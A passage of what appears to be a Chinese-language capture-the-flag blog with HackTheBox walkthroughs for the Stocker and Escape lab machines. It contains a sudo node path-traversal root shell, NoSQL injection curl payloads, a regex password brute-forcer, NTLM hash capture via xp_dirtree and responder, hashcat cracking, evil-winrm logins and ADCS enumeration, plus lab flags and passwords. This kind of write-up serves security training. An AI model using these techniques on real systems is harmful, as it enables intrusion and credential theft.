order.save();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.json(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">orderId</span>: order._id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/api/po/:id&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> order = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;Order&quot;</span>).findById(req.params.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!order) <span class="keyword">return</span> res.sendStatus(<span class="number">404</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> htmlPath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/pos/<span class="subst">$&#123;req.params.id&#125;</span>.html`</span>;</span><br><span class="line">  <span class="keyword">const</span> filePath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/pos/<span class="subst">$&#123;req.params.id&#125;</span>.pdf`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(filePath);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.writeFileSync(htmlPath, formatHTML(order));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> generatePDF(req.params.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(filePath);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendStatus(<span class="number">500</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/stock&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=auth-required&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">&quot;/templates/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/logout&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  req.session.user = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> mongoose.connect(dbURI);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setup Mongoose schema</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&quot;./schema.js&quot;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>得到登入密码<code>IHeardPassphrasesArePrettySecure</code></p>
<p>尝试用于登入angoose账户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh angoose@10.10.11.196</span><br><span class="line">IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure>
<p>登入成功<br />
查看user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/angoose/user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c86f19c14d8ee6120dd3c01461b82764</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-22"><a class="markdownIt-Anchor" href="#权限提升-22"></a> 权限提升</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for angoose on stocker:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User angoose may run the following commands on stocker:</span><br><span class="line">    (ALL) &#x2F;usr&#x2F;bin&#x2F;node &#x2F;usr&#x2F;local&#x2F;scripts&#x2F;*.js</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/bash&quot;, [&quot;-p&quot;], &#123;stdio: [0, 1, 2]&#125;)&#x27;</span> &gt; /tmp/BFL.js</span><br><span class="line">sudo /usr/bin/node /usr/<span class="built_in">local</span>/scripts/../../../tmp/BFL.js</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afd487cd1a8b2f2b99d610424c24f39c</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>错误思路</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb/login --json <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#x27;</span> -v</span><br><span class="line">...</span><br><span class="line">Location: /login?error=login-error</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb/login --json <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#x27;</span> -v</span><br><span class="line">...</span><br><span class="line">Location: /stock</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://dev.stocker.htb/login&quot;</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">dic = string.printable</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	exit = <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> dic:</span><br><span class="line">		json = &#123;<span class="string">&quot;username&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: <span class="string">&quot;angoose&quot;</span>&#125;, <span class="string">&quot;password&quot;</span>: &#123;<span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;^%s&quot;</span> % (password + _)&#125; &#125;</span><br><span class="line">		print(json)</span><br><span class="line">		res = req.post(url, json = json, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">		<span class="keyword">if</span> res.headers[<span class="string">&quot;Location&quot;</span>] == <span class="string">&quot;/stock&quot;</span>:</span><br><span class="line">			password = password + _</span><br><span class="line">			print(password)</span><br><span class="line">			exit = <span class="number">0</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> exit == <span class="number">1</span>:</span><br><span class="line">		exit()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b3e795719e2a644f69838a593dd159ac</span><br></pre></td></tr></table></figure>
<p>rockyou.txt没跑出来</p>
<hr />
<p>域渗透水平还是一如既往的差</p>
<h1 id="hackthebox_escape"><a class="markdownIt-Anchor" href="#hackthebox_escape"></a> HackTheBox_Escape</h1>
<h2 id="信息收集-7"><a class="markdownIt-Anchor" href="#信息收集-7"></a> 信息收集</h2>
<h3 id="端口扫描-24"><a class="markdownIt-Anchor" href="#端口扫描-24"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.202</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.202</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 9986 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp   open  domain?</span><br><span class="line">88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-08 22:14:40Z)</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span class="line">464&#x2F;tcp  open  kpasswd5?</span><br><span class="line">593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp  open  ssl&#x2F;ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">1433&#x2F;tcp open  ms-sql-s      Microsoft SQL Server</span><br><span class="line">3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp open  ssl&#x2F;ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">9389&#x2F;tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">2 services unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprints at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;8%Time&#x3D;64089A0A%P&#x3D;x86_64-pc-linux-gnu%r(DNSVe</span><br><span class="line">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span><br><span class="line">SF:04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port1433-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;8%Time&#x3D;64089A0B%P&#x3D;x86_64-pc-linux-gnu%r(ms-</span><br><span class="line">SF:sql-s,25,&quot;\x04\x01\0%\0\0\x01\0\0\0\x15\0\x06\x01\0\x1b\0\x01\x02\0\x1c</span><br><span class="line">SF:\0\x01\x03\0\x1d\0\0\xff\x0f\0\x07\xd0\0\0\0\0&quot;);</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-22"><a class="markdownIt-Anchor" href="#漏洞利用-22"></a> 漏洞利用</h2>
<p>枚举SMB分享路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.202 -u <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] Guest session   	IP: 10.10.11.202:445	Name: 10.10.11.202                                      </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	NO ACCESS	Logon server share </span><br><span class="line">	Public                                            	READ ONLY	</span><br><span class="line">	SYSVOL                                            	NO ACCESS	Logon server share</span><br></pre></td></tr></table></figure>
<p>匿名登入路径<code>/Public</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.202/Public</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.                                   D        0  Sat Nov 19 06:51:25 2022</span><br><span class="line">..                                  D        0  Sat Nov 19 06:51:25 2022</span><br><span class="line">SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022</span><br><span class="line"></span><br><span class="line">5184255 blocks of size 4096. 1468811 blocks available</span><br></pre></td></tr></table></figure>
<p>下载文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&quot;SQL Server Procedures.pdf&quot;</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>得到MSSQL登入凭证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PublicUser:GuestUserCantWrite1</span><br></pre></td></tr></table></figure>
<p>登入MSSQL服务并启用responder</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py PublicUser:GuestUserCantWrite1@10.10.11.202</span><br><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure>
<p>访问responder</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_dirtree &#x27;\\<span class="number">10</span>.<span class="number">10</span>.*.*\BFL&#x27;</span><br></pre></td></tr></table></figure>
<p>获得NTLMv2如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL_SVC::sequel:8ac23c4c29037047:e9eda6f3888b9877036279efea3cb3c0:01010000000000000090858da351d901e3f5635e3fb70b460000000002000800510059004200330001001e00570049004e002d00550053004d0032005a0036003600370048005300300004003400570049004e002d00550053004d0032005a003600360037004800530030002e0051005900420033002e004c004f00430041004c000300140051005900420033002e004c004f00430041004c000500140051005900420033002e004c004f00430041004c00070008000090858da351d90106000400020000000800300030000000000000000000000000300000f4ab4ae3d13aea1739c364c66324ca7ba193602fb63935e338e10f1745d4aa2a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000</span><br></pre></td></tr></table></figure>
<p>hashcat爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;SQL_SVC::sequel:8ac23c4c29037047:e9eda6f3888b9877036279efea3cb3c0:01010000000000000090858da351d901e3f5635e3fb70b460000000002000800510059004200330001001e00570049004e002d00550053004d0032005a0036003600370048005300300004003400570049004e002d00550053004d0032005a003600360037004800530030002e0051005900420033002e004c004f00430041004c000300140051005900420033002e004c004f00430041004c000500140051005900420033002e004c004f00430041004c00070008000090858da351d90106000400020000000800300030000000000000000000000000300000f4ab4ae3d13aea1739c364c66324ca7ba193602fb63935e338e10f1745d4aa2a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>明文如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REGGIE1234ronnie</span><br></pre></td></tr></table></figure>
<p>以sql_svc用户登入winrm服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie</span><br></pre></td></tr></table></figure>
<p>启用smb服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py BFL /tmp/ -smb2support</span><br></pre></td></tr></table></figure>
<p>回传文件</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span>-item -<span class="built_in">path</span> c:\sqlserver\logs\errorlog.bak -destination &#x27;\\<span class="number">10</span>.<span class="number">10</span>.*.*\BFL\&#x27;</span><br></pre></td></tr></table></figure>
<p>根据日志文件中的信息添加两个域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.202\tdc.sequel.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.202\tsequel.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>日志文件中存在两条登录信息如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.44 Logon       Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]</span><br></pre></td></tr></table></figure>
<p>查看用户信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py sql_svc:REGGIE1234ronnie@10.10.11.202</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209</span><br><span class="line">498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: sequel\Administrator (SidTypeUser)</span><br><span class="line">501: sequel\Guest (SidTypeUser)</span><br><span class="line">502: sequel\krbtgt (SidTypeUser)</span><br><span class="line">512: sequel\Domain Admins (SidTypeGroup)</span><br><span class="line">513: sequel\Domain Users (SidTypeGroup)</span><br><span class="line">514: sequel\Domain Guests (SidTypeGroup)</span><br><span class="line">515: sequel\Domain Computers (SidTypeGroup)</span><br><span class="line">516: sequel\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: sequel\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: sequel\Schema Admins (SidTypeGroup)</span><br><span class="line">519: sequel\Enterprise Admins (SidTypeGroup)</span><br><span class="line">520: sequel\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: sequel\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: sequel\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: sequel\Protected Users (SidTypeGroup)</span><br><span class="line">526: sequel\Key Admins (SidTypeGroup)</span><br><span class="line">527: sequel\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">553: sequel\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: sequel\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1000: sequel\DC$ (SidTypeUser)</span><br><span class="line">1101: sequel\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: sequel\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1103: sequel\Tom.Henn (SidTypeUser)</span><br><span class="line">1104: sequel\Brandon.Brown (SidTypeUser)</span><br><span class="line">1105: sequel\Ryan.Cooper (SidTypeUser)</span><br><span class="line">1106: sequel\sql_svc (SidTypeUser)</span><br><span class="line">1107: sequel\James.Roberts (SidTypeUser)</span><br><span class="line">1108: sequel\Nicole.Thompson (SidTypeUser)</span><br><span class="line">1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)</span><br></pre></td></tr></table></figure>
<p>用户名<code>NuclearMosquito3</code>并不存在</p>
<p>尝试将<code>NuclearMosquito3</code>作为<code>ryan.cooper</code>用户的密码登入winrm服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3</span><br></pre></td></tr></table></figure>
<p>登入成功，查看user.txt</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\ryan.cooper\desktop\user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0cbcb92fcd258be421cbdfbadaebd0bf</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-23"><a class="markdownIt-Anchor" href="#权限提升-23"></a> 权限提升</h2>
<blockquote>
<p>This is a quick lab to familiarize with ECS1 privilege escalation technique, that illustrates how it’s possible to elevate from a regular user to domain administrator in a Windows Domain by abusing over-permissioned Active Directory Certificate Services (ADCS) certificate templates.<br />
<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install certipy-ad</span><br></pre></td></tr></table></figure>
<p>该程序v4.3.0版本在python3.11环境无法正常运行</p>
<p>查询是否存在错误配置的证书模板</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -vulnerable -stdout -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : sequel-DC-CA</span><br><span class="line">    DNS Name                            : dc.sequel.htb</span><br><span class="line">    Certificate Subject                 : CN&#x3D;sequel-DC-CA, DC&#x3D;sequel, DC&#x3D;htb</span><br><span class="line">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101</span><br><span class="line">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00</span><br><span class="line">    Certificate Validity End            : 2121-11-18 21:08:46+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : SEQUEL.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : UserAuthentication</span><br><span class="line">    Display Name                        : UserAuthentication</span><br><span class="line">    Certificate Authorities             : sequel-DC-CA</span><br><span class="line">    Enabled                             : 